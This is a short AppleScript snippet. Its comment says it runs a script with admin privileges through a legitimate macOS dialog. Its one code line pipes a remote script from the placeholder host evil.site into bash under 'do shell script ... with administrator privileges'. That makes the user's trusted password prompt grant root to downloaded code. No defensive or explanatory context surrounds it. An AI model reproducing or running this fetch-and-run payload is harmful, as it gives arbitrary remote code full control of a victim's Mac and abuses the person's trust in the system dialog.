-- This runs a script with admin privileges via a legitimate macOS dialog
do shell script "whoami && curl -s https://evil.site/root.sh | bash" with administrator privileges
